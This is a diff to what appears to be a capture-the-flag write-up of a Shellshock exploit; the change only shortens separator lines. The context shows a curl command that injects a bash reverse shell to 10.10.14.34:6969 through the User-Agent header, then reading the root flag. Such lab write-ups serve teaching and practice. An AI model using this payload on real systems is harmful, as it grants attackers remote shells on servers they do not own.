@@ -120,7 +120,7 @@ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.34/6969 0>&1' 
 This attempt works straight off the bat...Shellshock is  an important vulnerability to know about.
 [Wiki on shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29)
 
-###############################################################
+#####################
 
 So we got user shell on the target...
 
@@ -158,6 +158,6 @@ cat /root/root.txt
 
 ```
 
-###########################################
+#########################
 
 Simple when you know.
